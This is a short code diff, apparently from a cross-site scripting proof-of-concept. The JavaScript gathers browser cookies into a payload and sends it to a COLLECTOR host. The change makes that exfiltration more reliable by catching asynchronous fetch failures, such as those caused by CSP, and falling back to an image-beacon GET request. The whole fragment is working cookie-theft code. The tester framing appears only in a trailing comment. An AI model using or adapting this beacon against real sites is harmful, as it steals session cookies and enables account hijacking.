@@ -21,12 +21,13 @@
     httpOnlyLikely: c.indexOf("session") === -1 && c.indexOf("sid") === -1
   };
 
-  // Primary: POST (no-cors so it always sends)
+  // Primary: POST (no-cors so it always sends). fetch() rejects ASYNCHRONOUSLY (network/CSP), which a
+  // try/catch does NOT catch — so handle both the sync throw AND the promise rejection, else the beacon is lost.
+  function fallback() { new Image().src = COLLECTOR + "?d=" + encodeURIComponent(JSON.stringify(payload)); }
   try {
-    fetch(COLLECTOR, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
+    fetch(COLLECTOR, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) }).catch(fallback);
   } catch (e) {
-    // Fallback: GET beacon
-    new Image().src = COLLECTOR + "?d=" + encodeURIComponent(JSON.stringify(payload));
+    fallback();
   }
 
   // Note for the tester (visible in console during a manual PoC):
